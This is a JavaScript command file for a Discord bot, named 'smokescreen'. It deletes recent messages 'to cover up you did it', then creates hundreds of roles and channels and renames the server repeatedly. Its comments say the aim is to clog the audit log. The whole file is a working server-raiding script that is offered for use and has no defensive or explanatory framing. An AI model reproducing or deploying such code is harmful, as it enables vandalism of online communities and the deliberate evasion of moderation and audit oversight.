const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {


    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'Non des roles',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 500; i++) {
                message.guild.createChannel('Nom des channel vocalK', 'voice')
                message.guild.createChannel('Nom des channel texte', 'text')
                //changes name tons of times to clog up the audit log
                message.guild.setName("Nom du serveur qui va être mis");
                }
            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
